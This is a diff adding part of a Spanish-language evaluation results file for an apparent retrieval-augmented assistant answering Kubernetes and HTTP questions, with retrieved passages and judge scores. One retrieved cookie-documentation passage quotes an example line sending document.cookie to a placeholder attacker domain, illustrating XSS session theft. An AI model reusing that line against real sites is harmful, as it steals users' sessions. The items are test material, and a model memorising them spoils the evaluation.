+      "referencia": "Como máximo el 25% (maxUnavailable), y como máximo un 25% por encima del número deseado (maxSurge).",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "generar"
+      ],
+      "intentos": 0,
+      "error": null,
+      "segundos": 13.49,
+      "respuesta": "Por defecto, el número máximo de Pods que pueden quedar no disponibles durante la actualización de un Deployment es del 25%. Esto se menciona en ambos documentos [1] y [2].",
+      "respuesta_cruda": "Por defecto, el número máximo de Pods que pueden quedar no disponibles durante la actualización de un Deployment es del 25%. Esto se menciona en ambos documentos [1] y [2].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Deployment > Escribir una especificación de Deployment > Estrategia\n`.spec.strategy.rollingUpdate.maxUnavailable` es un campo opcional que indica el número máximo\nde Pods que pueden no estar disponibles durante el proceso de actualización. El valor puede ser un número absoluto (por ejemplo, 5)\no un porcentaje de los Pods deseados (por ejemplo, 10%). El número absoluto se calcula a partir del porcentaje\ncon redondeo a la baja. El valor no puede ser 0 si `.spec.strategy.rollingUpdate.maxSurge` es 0. El valor predeterminado es 25%.  \nPor ejemplo, cuando este valor es 30%, el ReplicaSet viejo puede escalarse al 70% de los\nPods deseados de forma inmediata tras comenzar el proceso de actualización. Una vez que los Pods están listos,\nel ReplicaSet viejo puede reducirse aún mas, seguido de un escalado del nuevo ReplicaSet,",
+          "fuente": "04-k8s-deployments.md",
+          "seccion": "Deployment > Escribir una especificación de Deployment > Estrategia",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9964
+        },
+        {
+          "texto": "Deployment > Actualizar un Deployment\nkubectl get pods\n```\n```\nNAME                                READY     STATUS    RESTARTS   AGE\nnginx-deployment-1564180365-khku8   1/1       Running   0          14s\nnginx-deployment-1564180365-nacti   1/1       Running   0          14s\nnginx-deployment-1564180365-z9gth   1/1       Running   0          14s\n```  \nLa próxima vez que quieras actualizar estos Pods, sólo necesitas actualizar la plantilla Pod del Deployment otra vez.  \nEl Deployment permite garantizar que sólo un número determinado de Pods puede eliminarse mientras se están actualizando.\nPor defecto, garantiza que al menos el 25% menos del número deseado de Pods se está ejecutando (máx. 25% no disponible).",
+          "fuente": "04-k8s-deployments.md",
+          "seccion": "Deployment > Actualizar un Deployment",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9947
+        }
+      ],
+      "juez": {
+        "estado": "juzgada",
+        "afirmaciones": [
+          {
+            "texto": "Por defecto, el número máximo de Pods que pueden quedar no disponibles durante la actualización de un Deployment es del 25%.",
+            "respaldada": true
+          },
+          {
+            "texto": "Esto se menciona en ambos documentos [1] y [2].",
+            "respaldada": true
+          }
+        ],
+        "n_afirmaciones": 2,
+        "respaldadas": 2,
+        "fidelidad": 1.0,
+        "correccion": "parcial",
+        "motivo": "La respuesta incluye la información esencial sobre maxUnavailable (25%), que coincide con la referencia, pero omite la parte de la referencia que indica que por defecto también se permite un maxSurge de hasta un 25% por encima del número deseado.",
+        "intentos": 1
+      }
+    },
+    {
+      "id": 10,
+      "tipo": "codigo_exacto",
+      "pregunta": "¿Cómo vuelvo a una revisión anterior de un Deployment?",
+      "con_respuesta": true,
+      "referencia": "Con kubectl rollout undo; con --to-revision se elige una revisión concreta.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "generar"
+      ],
+      "intentos": 0,
+      "error": null,
+      "segundos": 15.1,
+      "respuesta": "Para volver a una revisión anterior de un Deployment, puedes usar el siguiente comando:\n\n```shell\nkubectl rollout undo deployment.v1.apps/nginx-deployment --to-revision=<número_de_revisión>\n```\n\nPor ejemplo, para retroceder al Deployment \"nginx-deployment\" a la revisión 2, se ejecuta:\n```shell\nkubectl rollout undo deployment.v1.apps/nginx-deployment --to-revision=2\n```\n[1]",
+      "respuesta_cruda": "Para volver a una revisión anterior de un Deployment, puedes usar el siguiente comando:\n\n```shell\nkubectl rollout undo deployment.v1.apps/nginx-deployment --to-revision=<número_de_revisión>\n```\n\nPor ejemplo, para retroceder al Deployment \"nginx-deployment\" a la revisión 2, se ejecuta:\n```shell\nkubectl rollout undo deployment.v1.apps/nginx-deployment --to-revision=2\n```\n[1]",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Deployment > Revertir un Deployment > Retroceder a una Revisión Previa\nAhora has decidido que quieres deshacer el despliegue actual y retrocederlo a la revisión previa:  \n```shell\nkubectl rollout undo deployment.v1.apps/nginx-deployment\n```\n```\ndeployment.apps/nginx-deployment\n```  \nAlternativamente, puedes retroceder a una revisión específica con el parámetro `--to-revision`:  \n```shell\nkubectl rollout undo deployment.v1.apps/nginx-deployment --to-revision=2\n```\n```\ndeployment.apps/nginx-deployment\n```  \nPara más detalles acerca de los comandos relacionados con las revisiones de un Deployment, echa un vistazo a `kubectl rollout`.  \nEl Deployment se ha revertido ahora a una revisión previa estable. Como se puede comprobar, el controlador del Deployment genera un evento `DeploymentRollback`\nal retroceder a la revisión 2.  \n```shell",
+          "fuente": "04-k8s-deployments.md",
+          "seccion": "Deployment > Revertir un Deployment > Retroceder a una Revisión Previa",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9972
+        },
+        {
+          "texto": "Deployment > Revertir un Deployment > Retroceder a una Revisión Previa\nNormal  DeploymentRollback  15s   deployment-controller  Rolled back deployment \"nginx-deployment\" to revision 2\nNormal  ScalingReplicaSet   15s   deployment-controller  Scaled down replica set nginx-deployment-595696685f to 0\n```",
+          "fuente": "04-k8s-deployments.md",
+          "seccion": "Deployment > Revertir un Deployment > Retroceder a una Revisión Previa",
+          "confidencialidad": "publico",
+          "puntuacion": 0.97
+        }
+      ],
+      "juez": {
+        "estado": "juzgada",
+        "afirmaciones": [
+          {
+            "texto": "Usar kubectl rollout undo deployment.v1.apps/nginx-deployment --to-revision=<número_de_revisión> para volver a una revisión anterior",
+            "respaldada": true
+          },
+          {
+            "texto": "Ejemplo: kubectl rollout undo deployment.v1.apps/nginx-deployment --to-revision=2",
+            "respaldada": true
+          }
+        ],
+        "n_afirmaciones": 2,
+        "respaldadas": 2,
+        "fidelidad": 1.0,
+        "correccion": "correcta",
+        "motivo": "La respuesta incluye el comando correcto y el uso del parámetro --to-revision, tal como indica la referencia y los documentos, sin omitir información esencial.",
+        "intentos": 1
+      }
+    },
+    {
+      "id": 11,
+      "tipo": "factual",
+      "pregunta": "¿Puedo guardar contraseñas en un ConfigMap?",
+      "con_respuesta": true,
+      "referencia": "No es lo adecuado: un ConfigMap no proporciona cifrado. Para datos confidenciales hay que usar un Secret.",
+      "recall5": false,
+      "no_lo_tengo": true,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "reescribir",
+        "recuperar",
+        "evaluar",
+        "sin_respuesta"
+      ],
+      "intentos": 1,
+      "error": null,
+      "segundos": 24.06,
+      "respuesta": "No lo tengo en la documentación.",
+      "respuesta_cruda": null,
+      "salida_bloqueada": false,
+      "fragmentos": [],
+      "juez": {
+        "estado": "no_aplica",
+        "motivo": "no_lo_tengo"
+      }
+    },
+    {
+      "id": 12,
+      "tipo": "restringido",
+      "pregunta": "¿Qué tamaño máximo puede tener un Secret?",
+      "con_respuesta": true,
+      "referencia": "1 MiB, para no agotar la memoria del apiserver y del kubelet. (Documento marcado como restringido: con filtro de permisos, debe responder que no lo tiene.)",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "generar"
+      ],
+      "intentos": 0,
+      "error": null,
+      "segundos": 12.34,
+      "respuesta": "Los `Secrets` individuales están limitados a 1MiB de tamaño [1].",
+      "respuesta_cruda": "Los `Secrets` individuales están limitados a 1MiB de tamaño [1].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Secrets > Detalles > Restricciones\nLas fuentes del volumen del  Secret  se validan para garantizar que la referencia del objeto especificado apunte a un objeto de tipo `Secret`. Por lo tanto, se debe crear un `Secret` antes de que cualquier pod dependa de él.  \nLos objetos API Secret residen en namespace.\nSolo pueden ser referenciados por pods en el mismo namespace.  \nLos `Secrets` individuales estan limitados a 1MiB de tamaño.  Esto es para desalentar la creación de `Secrets` muy grandes que agotarían la memoria del apiserver y de kubelet.\nSin embargo la creación de muchos Secrets más pequeños también podría agotar la memoria. Límites más completos en el uso de memoria debido a `Secret` es una característica planificada.",
+          "fuente": "06-k8s-secrets.md",
+          "seccion": "Secrets > Detalles > Restricciones",
+          "confidencialidad": "restringido",
+          "puntuacion": 0.9586
+        }
+      ],
+      "juez": {
+        "estado": "sin_juzgar",
+        "motivo": "restringido",
+        "intentos": 0,
+        "error": null
+      }
+    },
+    {
+      "id": 13,
+      "tipo": "multi_hop",
+      "pregunta": "¿Qué tipo de base de datos usa Kubernetes para guardar los Secrets?",
+      "con_respuesta": true,
+      "referencia": "Los Secrets se guardan en etcd (doc. de Secrets), que es un almacén clave-valor persistente, consistente y distribuido (doc. de componentes).",
+      "recall5": false,
+      "no_lo_tengo": false,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "generar"
+      ],
+      "intentos": 0,
+      "error": null,
+      "segundos": 12.85,
+      "respuesta": "Kubernetes utiliza etcd como banco de datos para guardar los Secrets. Etcd mantiene el estado de todo el clúster, incluidos los Secretos [1].",
+      "respuesta_cruda": "Kubernetes utiliza etcd como banco de datos para guardar los Secrets. Etcd mantiene el estado de todo el clúster, incluidos los Secretos [1].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Vista General de Seguridad Cloud Native > Nube (Cloud) > Seguridad de la Infraestructura {#infrastructure-security}\nAcceso a etcd | El acceso a etcd (banco de datos de Kubernetes) debe ser limitado apenas al plano de control. Dependiendo de su configuración, debería intentar usar etcd sobre TLS. Puede encontrar mas información en la documentación de etcd.\nEncriptación etcd | Siempre que sea posible, es una buena práctica encriptar todas las unidades de almacenamiento. Etcd mantiene el estado de todo el clúster (incluidos los Secretos), por lo que su disco debe estar encriptado.",
+          "fuente": "09-k8s-seguridad-cloud-native.md",
+          "seccion": "Vista General de Seguridad Cloud Native > Nube (Cloud) > Seguridad de la Infraestructura {#infrastructure-security}",
+          "confidencialidad": "publico",
+          "puntuacion": 0.8178
+        }
+      ],
+      "juez": {
+        "estado": "juzgada",
+        "afirmaciones": [
+          {
+            "texto": "Kubernetes utiliza etcd como banco de datos para guardar los Secrets.",
+            "respaldada": true
+          },
+          {
+            "texto": "Etcd mantiene el estado de todo el clúster, incluidos los Secretos.",
+            "respaldada": true
+          }
+        ],
+        "n_afirmaciones": 2,
+        "respaldadas": 2,
+        "fidelidad": 1.0,
+        "correccion": "correcta",
+        "motivo": "La respuesta indica que los Secrets se almacenan en etcd, lo cual coincide con la referencia. No incluye detalles adicionales, pero la información esencial es correcta y está respaldada por los documentos.",
+        "intentos": 1
+      }
+    },
+    {
+      "id": 14,
+      "tipo": "numerico",
+      "pregunta": "¿Cuántos caracteres puede tener como máximo el valor de una etiqueta en Kubernetes?",
+      "con_respuesta": true,
+      "referencia": "63 caracteres, empezando y terminando por un carácter alfanumérico.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "generar"
+      ],
+      "intentos": 0,
+      "error": null,
+      "segundos": 12.5,
+      "respuesta": "Los valores de etiqueta válidos deben tener como máximo 63 caracteres [1].",
+      "respuesta_cruda": "Los valores de etiqueta válidos deben tener como máximo 63 caracteres [1].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Etiquetas y Selectores > Sintaxis y conjunto de caracteres\nSi se omite el prefijo, la clave de la etiqueta se entiende que es privada para el usuario. Los componentes automatizados del sistema (ej. `kube-scheduler`, `kube-controller-manager`, `kube-apiserver`, `kubectl`, u otros de terceras partes) que añaden etiquetas a los objetos de usuario deben especificar obligatoriamente un prefijo.  \nLos prefijos `kubernetes.io/` y `k8s.io/` están reservados para el sistema de Kubernetes.  \nLos valores de etiqueta válidos deben tener como máximo 63 caracteres y empezar y terminar con un carácter alfanumérico (`[a-z0-9A-Z]`), con guiones (`-`), guiones bajos (`_`), puntos (`.`), y cualquier carácter alfanumérico en medio.",
+          "fuente": "07-k8s-etiquetas-selectores.md",
+          "seccion": "Etiquetas y Selectores > Sintaxis y conjunto de caracteres",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9995
+        }
+      ],
+      "juez": {
+        "estado": "juzgada",
+        "afirmaciones": [
+          {
+            "texto": "Los valores de etiqueta válidos deben tener como máximo 63 caracteres",
+            "respaldada": true
+          }
+        ],
+        "n_afirmaciones": 1,
+        "respaldadas": 1,
+        "fidelidad": 1.0,
+        "correccion": "parcial",
+        "motivo": "La respuesta omite que el valor de la etiqueta debe empezar y terminar con un carácter alfanumérico, información esencial presente en la respuesta de referencia.",
+        "intentos": 1
+      }
+    },
+    {
+      "id": 15,
+      "tipo": "factual",
+      "pregunta": "Si no hay ninguna NetworkPolicy, ¿un Pod acepta conexiones entrantes?",
+      "con_respuesta": true,
+      "referencia": "Sí. Por defecto un Pod no está aislado para la entrada: se permiten todas las conexiones entrantes.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "generar"
+      ],
+      "intentos": 0,
+      "error": null,
+      "segundos": 11.82,
+      "respuesta": "Por defecto, un Pod no está aislado para la entrada; todas las conexiones entrantes están permitidas [1]. Por lo tanto, si no hay ninguna NetworkPolicy, un Pod acepta conexiones entrantes.",
+      "respuesta_cruda": "Por defecto, un Pod no está aislado para la entrada; todas las conexiones entrantes están permitidas [1]. Por lo tanto, si no hay ninguna NetworkPolicy, un Pod acepta conexiones entrantes.",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Políticas de red (Network Policies) > Dos Tipos de Aislamiento de Pod\nPor defecto, un Pod no está aislado para la entrada; todas las conexiones entrantes están permitidas. Un Pod está aislado para la entrada si hay alguna NetworkPolicy con \"Ingress\" en su `policyTypes` que seleccione el Pod; decimos que tal política se aplica al Pod para la entrada. Cuando un Pod está aislado para la entrada, las únicas conexiones permitidas en el Pod son las del nodo del Pod y las permitidas por la lista `ingress` de alguna NetworkPolicy que se apliquen al Pod para la entrada. Los valores de esas listas de direcciones se combinan de forma aditiva.",
+          "fuente": "08-k8s-network-policies.md",
+          "seccion": "Políticas de red (Network Policies) > Dos Tipos de Aislamiento de Pod",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9975
+        },
+        {
+          "texto": "Políticas de red (Network Policies) > Políticas por defecto > Denegar por defecto todo el tráfico de entrada y de salida\nPuedes crear una política que \"por defecto\" en un Namespace impida todo el tráfico de entrada y de salida creando la siguiente NetworkPolicy en ese Namespace.  \nEsto asegura que incluso los Pods que no son seleccionados por ninguna otra NetworkPolicy no tendrán permitido el tráfico de entrada o salida.",
+          "fuente": "08-k8s-network-policies.md",
+          "seccion": "Políticas de red (Network Policies) > Políticas por defecto > Denegar por defecto todo el tráfico de entrada y de salida",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9046
+        }
+      ],
+      "juez": {
+        "estado": "juzgada",
+        "afirmaciones": [
+          {
+            "texto": "Por defecto, un Pod no está aislado para la entrada; todas las conexiones entrantes están permitidas.",
+            "respaldada": true
+          },
+          {
+            "texto": "Si no hay ninguna NetworkPolicy, un Pod acepta conexiones entrantes.",
+            "respaldada": true
+          }
+        ],
+        "n_afirmaciones": 2,
+        "respaldadas": 2,
+        "fidelidad": 1.0,
+        "correccion": "correcta",
+        "motivo": "La respuesta del asistente coincide con la respuesta de referencia y todas sus afirmaciones están respaldadas por los documentos proporcionados.",
+        "intentos": 1
+      }
+    },
+    {
+      "id": 16,
+      "tipo": "factual",
+      "pregunta": "¿Cuáles son las 4C de la seguridad cloud native?",
+      "con_respuesta": true,
+      "referencia": "Cloud (la nube), Clústeres, Contenedores y Código.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "generar"
+      ],
+      "intentos": 0,
+      "error": null,
+      "segundos": 13.8,
+      "respuesta": "Las 4C de la seguridad en Cloud Native son:\n\n1. **Cloud** (nube)\n2. Clústeres\n3. Contenedores\n4. Código\n\nEste enfoque por capas aumenta la defensa en profundidad, según se menciona en [1].",
+      "respuesta_cruda": "Las 4C de la seguridad en Cloud Native son:\n\n1. **Cloud** (nube)\n2. Clústeres\n3. Contenedores\n4. Código\n\nEste enfoque por capas aumenta la defensa en profundidad, según se menciona en [1].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Vista General de Seguridad Cloud Native > Las 4C de Seguridad en Cloud Native\nPuede pensar en seguridad por capas. Las 4C de la seguridad en Cloud Native son la nube (Cloud),\nClústeres, Contenedores y Código.  \n> **Nota:**\nEste enfoque en capas aumenta la defensa en profundidad)\nde la seguridad, es considerada una buena práctica en seguridad para el software de sistemas.  \nCada capa del modelo de seguridad Cloud Native es basada en la siguiente capa más externa.\nLa capa de código se beneficia de una base sólida (nube, clúster, contenedor) de capas seguras.\nNo podemos garantizar la seguridad aplicando solo seguridad a nivel del código, y usar estándares de seguridad deficientes en las otras capas.",
+          "fuente": "09-k8s-seguridad-cloud-native.md",
+          "seccion": "Vista General de Seguridad Cloud Native > Las 4C de Seguridad en Cloud Native",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9999
+        }
+      ],
+      "juez": {
+        "estado": "juzgada",
+        "afirmaciones": [
+          {
+            "texto": "Las 4C de la seguridad en Cloud Native son Cloud (nube), Clústeres, Contenedores y Código",
+            "respaldada": true
+          },
+          {
+            "texto": "El enfoque por capas aumenta la defensa en profundidad",
+            "respaldada": true
+          }
+        ],
+        "n_afirmaciones": 2,
+        "respaldadas": 2,
+        "fidelidad": 1.0,
+        "correccion": "correcta",
+        "motivo": "La respuesta incluye todas las 4C tal como indica el documento y añade una afirmación adicional que también está respaldada; no contradice la respuesta de referencia.",
+        "intentos": 1
+      }
+    },
+    {
+      "id": 17,
+      "tipo": "factual",
+      "pregunta": "¿HTTP guarda información entre una petición y la siguiente?",
+      "con_respuesta": true,
+      "referencia": "No, es un protocolo sin estado. Las cookies permiten mantener sesiones con estado.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "generar"
+      ],
+      "intentos": 0,
+      "error": null,
+      "segundos": 11.93,
+      "respuesta": "No, HTTP es un protocolo sin estado, lo que significa que no guarda ningún dato entre dos peticiones en la misma sesión [1]. Sin embargo, el uso de cookies permite guardar datos con respecto a la sesión de comunicación, creando así un contexto común para cada sesión de comunicación [1].",
+      "respuesta_cruda": "No, HTTP es un protocolo sin estado, lo que significa que no guarda ningún dato entre dos peticiones en la misma sesión [1]. Sin embargo, el uso de cookies permite guardar datos con respecto a la sesión de comunicación, creando así un contexto común para cada sesión de comunicación [1].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Generalidades del protocolo HTTP > Características clave del protocolo HTTP > HTTP es un protocolo con sesiones, pero sin estados\nHTTP es un protocolo sin estado, es decir: no guarda ningún dato entre dos peticiones en la mísma sesión. Esto crea problemáticas, en caso de que los usuarios requieran interactuar con determinadas páginas Web de forma ordenada y coherente, por ejemplo, para el uso de \"cestas de la compra\" en páginas que utilizan en comercio electrónico. Pero, mientras HTTP ciertamente es un protocolo sin estado, el uso de HTTP cookies, si permite guardar datos con respecto a la sesión de comunicación. Usando la capacidad de ampliación del protocolo HTTP, las cookies permiten crear un contexto común para cada sesión de comunicación.",
+          "fuente": "16-http-vision-general.md",
+          "seccion": "Generalidades del protocolo HTTP > Características clave del protocolo HTTP > HTTP es un protocolo con sesiones, pero sin estados",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9864
+        },
+        {
+          "texto": "HTTP cookies\nUna cookie HTTP, cookie web o cookie de navegador es una pequeña pieza de datos que un servidor envía a el navegador web del usuario. El navegador guarda estos datos y los envía de regreso junto con la nueva petición al mismo servidor. Las cookies se usan generalmente para decirle al servidor que dos peticiones tienen su origen en el mismo navegador web lo que permite, por ejemplo, mantener la sesión de un usuario abierta. Las cookies permiten recordar la información de estado en vista a que el protocolo HTTP es un protocolo sin estado.  \nLas cookies se utilizan principalmente con tres propósitos:  \n- Gestión de Sesiones\n- : Inicios de sesión, carritos de compras, puntajes de juegos o cualquier otra cosa que el servidor deba recordar\n- Personalización",
+          "fuente": "18-http-cookies.md",
+          "seccion": "HTTP cookies",
+          "confidencialidad": "publico",
+          "puntuacion": 0.8865
+        },
+        {
+          "texto": "HTTP caching > Visión general\nLa caché HTTP almacena una respuesta asociada con una solicitud y reutiliza la respuesta almacenada para solicitudes posteriores.  \nHay varias ventajas de reusabilidad. En primer lugar, dado que no es necesario enviar la solicitu al servidor origen, cuanto más cerca están el cliente y la caché, más rápida será la respuesta. El ejemplo más típico es cuando el navegador almacena una caché para las solicitudes.  \nAdemás, cuando una respuesta es reutilizable, el servidor de origen no necesita procesar la solicitud, por lo que no necesita parsear y enrutar la solicitud, restaurar la sesión en función de la cookie, consultar los resultados de la base de datos o renderizar la plantilla. Eso reduce la carga en el servidor.",
+          "fuente": "19-http-cache.md",
+          "seccion": "HTTP caching > Visión general",
+          "confidencialidad": "publico",
+          "puntuacion": 0.8614
+        }
+      ],
+      "juez": {
+        "estado": "juzgada",
+        "afirmaciones": [
+          {
+            "texto": "HTTP es un protocolo sin estado, lo que significa que no guarda ningún dato entre dos peticiones en la misma sesión.",
+            "respaldada": true
+          },
+          {
+            "texto": "El uso de cookies permite guardar datos con respecto a la sesión de comunicación, creando así un contexto común para cada sesión de comunicación.",
+            "respaldada": true
+          }
+        ],
+        "n_afirmaciones": 2,
+        "respaldadas": 2,
+        "fidelidad": 1.0,
+        "correccion": "correcta",
+        "motivo": "La respuesta del asistente coincide con la referencia: afirma que HTTP es sin estado y que las cookies permiten mantener información de sesión. Ambas afirmaciones están respaldadas por los documentos.",
+        "intentos": 1
+      }
+    },
+    {
+      "id": 18,
+      "tipo": "factual",
+      "pregunta": "¿Qué método HTTP usa el navegador en la verificación previa (preflight) de CORS?",
+      "con_respuesta": true,
+      "referencia": "OPTIONS.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "generar"
+      ],
+      "intentos": 0,
+      "error": null,
+      "segundos": 12.34,
+      "respuesta": "El navegador utiliza el método HTTP `OPTIONS` para realizar la verificación previa (preflight) en CORS [1]. Este método se emplea para determinar si la solicitud real es segura de enviar, ya que puede afectar a los datos del usuario [2].",
+      "respuesta_cruda": "El navegador utiliza el método HTTP `OPTIONS` para realizar la verificación previa (preflight) en CORS [1]. Este método se emplea para determinar si la solicitud real es segura de enviar, ya que puede afectar a los datos del usuario [2].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Intercambio de recursos de origen cruzado (CORS) > Ejemplos de escenarios de control de acceso > Solicitudes verificadas previamente\nVary: Accept-Encoding, Origin\nKeep-Alive: timeout=2, max=100\nConnection: Keep-Alive\n```  \nLas primeras diez líneas representan la solicitud de verificación previa con el método `OPTIONS`. El navegador determina que necesita enviar esto basándose en los parámetros de petición que el fragmento de código JavaScript de arriba ha usado, para que el servidor pueda responder si es aceptable enviar la petición con los parámetros de solicitud reales. OPTIONS es un método HTTP/1.1 que se utiliza para determinar con más detalle la información de los servidores y es un método seguro, lo que significa que no se puede utilizar para cambiar el recurso. Observe que junto con la solicitud OPTIONS, se envían otras dos cabeceras de solicitud (líneas nueve y diez respectivamente):  \n```http",
+          "fuente": "17-http-cors.md",
+          "seccion": "Intercambio de recursos de origen cruzado (CORS) > Ejemplos de escenarios de control de acceso > Solicitudes verificadas previamente",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9802
+        },
+        {
+          "texto": "Intercambio de recursos de origen cruzado (CORS) > Ejemplos de escenarios de control de acceso > Solicitudes verificadas previamente\nA diferencia de las solicitudes simples, para las \"solicitudes verificadas previamente\" el navegador envía primero una petición HTTP utilizando el método OPTIONS al recurso en el otro origen, para determinar si la solicitud real es segura de enviar. Este tipo de solicitudes entre orígenes se verifican previamente porque pueden afectar a los datos del usuario.  \nA continuación se muestra un ejemplo de solicitud que se comprobará previamente:  \n```js\nconst xhr = new XMLHttpRequest();\nxhr.open(\"POST\", \"https://bar.other/doc\");\nxhr.setRequestHeader(\"X-PINGOTHER\", \"pingpong\");\nxhr.setRequestHeader(\"Content-Type\", \"text/xml\");\nxhr.onreadystatechange = handler;\nxhr.send(\"Arun\");\n```",
+          "fuente": "17-http-cors.md",
+          "seccion": "Intercambio de recursos de origen cruzado (CORS) > Ejemplos de escenarios de control de acceso > Solicitudes verificadas previamente",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9665
+        },
+        {
+          "texto": "Intercambio de recursos de origen cruzado (CORS) > Las cabeceras de solicitud HTTP > Access-Control-Request-Method\nLa cabecera de solicitud Access-Control-Request-Method se utiliza cuando se emite una solicitud de verificación previa para que el servidor sepa qué método HTTP se utilizará cuando se realice la solicitud real.  \n```http\nAccess-Control-Request-Method:\n```  \nPuede encontrar ejemplos de este uso arriba",
+          "fuente": "17-http-cors.md",
+          "seccion": "Intercambio de recursos de origen cruzado (CORS) > Las cabeceras de solicitud HTTP > Access-Control-Request-Method",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9325
+        }
+      ],
+      "juez": {
+        "estado": "juzgada",
+        "afirmaciones": [
+          {
+            "texto": "El navegador utiliza el método HTTP OPTIONS para realizar la verificación previa (preflight) en CORS.",
+            "respaldada": true
+          },
+          {
+            "texto": "Este método se emplea para determinar si la solicitud real es segura de enviar, ya que puede afectar a los datos del usuario.",
+            "respaldada": true
+          }
+        ],
+        "n_afirmaciones": 2,
+        "respaldadas": 2,
+        "fidelidad": 1.0,
+        "correccion": "correcta",
+        "motivo": "La respuesta del asistente coincide con la referencia al indicar que el método es OPTIONS y añade información correcta respaldada por los documentos, sin contradecir la referencia.",
+        "intentos": 1
+      }
+    },
+    {
+      "id": 19,
+      "tipo": "factual",
+      "pregunta": "¿Para qué sirve el atributo HttpOnly de una cookie?",
+      "con_respuesta": true,
+      "referencia": "Hace que la cookie no sea accesible desde JavaScript (document.cookie) y solo se envíe al servidor, lo que ayuda a prevenir ataques XSS.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "generar"
+      ],
+      "intentos": 0,
+      "error": null,
+      "segundos": 12.62,
+      "respuesta": "El atributo `HttpOnly` en una cookie ayuda a prevenir ataques cross-site scripting (XSS) al hacer que la cookie sea inaccesible desde la API de JavaScript `Document.cookie`. Esto significa que las cookies con este atributo solo se envían al servidor y no pueden ser accedidas por scripts maliciosos, mitigando así el riesgo de robo de sesión a través de XSS [2].",
+      "respuesta_cruda": "El atributo `HttpOnly` en una cookie ayuda a prevenir ataques cross-site scripting (XSS) al hacer que la cookie sea inaccesible desde la API de JavaScript `Document.cookie`. Esto significa que las cookies con este atributo solo se envían al servidor y no pueden ser accedidas por scripts maliciosos, mitigando así el riesgo de robo de sesión a través de XSS [2].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "HTTP cookies > Seguridad > Secuestro de session y XSS\nLas cookies son utilizadas a menudo en aplicaciones web para identificar a un usuario y su sesión autenticada, así que el robo de una cookie puede implicar el secuestro de la sesión del usuario autenticado. Las formas más comunes de robar cookies incluyen ingeniería social o la explotación de una vulnerabilidad XSS de la aplicación.  \n```js\nnew Image().src =\n\"http://www.evil-domain.com/steal-cookie.php?cookie=\" + document.cookie;\n```  \nEl atributo cookie `HttpOnly` puede ayudar a mitigar este ataque evitando el acceso al valor de la cookie a través de JavaScript.",
+          "fuente": "18-http-cookies.md",
+          "seccion": "HTTP cookies > Seguridad > Secuestro de session y XSS",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9935
+        },
+        {
+          "texto": "HTTP cookies > Creando cookies > Cookies `Secure` y `HttpOnly`\nUna cookie segura sólo se envía al servidor con una petición cifrada sobre el protocolo HTTPS. Incluso con `Secure`, no debería almacenarse _nunca_ información sensible en la cookies, ya que son inherentemente inseguras y este flag no puede ofrecer protección real. A partir de Chrome 52 y Firefox 52, los sitios inseguros (`http:`) no pueden establecer cookies con la directiva `Secure`.  \nPara prevenir ataques cross-site scripting (XSS), las cookies `HttpOnly` son inaccesibles desde la API de Javascript Document.cookie; Solamente se envían al servidor. Por ejemplo, las cookies que persisten sesiones del lado del servidor no necesitan estar disponibles para JavaScript, por lo que debería establecerse el flag `HttpOnly`.  \n```",
+          "fuente": "18-http-cookies.md",
+          "seccion": "HTTP cookies > Creando cookies > Cookies `Secure` y `HttpOnly`",
+          "confidencialidad": "publico",
+          "puntuacion": 0.935
+        },
+        {
+          "texto": "HTTP cookies > Creando cookies > Cookies `Secure` y `HttpOnly`\n```\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly\n```",
+          "fuente": "18-http-cookies.md",
+          "seccion": "HTTP cookies > Creando cookies > Cookies `Secure` y `HttpOnly`",
+          "confidencialidad": "publico",
+          "puntuacion": 0.4521
+        }
+      ],
+      "juez": {
+        "estado": "juzgada",
+        "afirmaciones": [
+          {
+            "texto": "El atributo HttpOnly en una cookie ayuda a prevenir ataques cross-site scripting (XSS)",
+            "respaldada": true
+          },
+          {
+            "texto": "Hace que la cookie sea inaccesible desde la API de JavaScript Document.cookie",
+            "respaldada": true
+          },
+          {
+            "texto": "Las cookies con este atributo solo se envían al servidor",
+            "respaldada": true
+          },
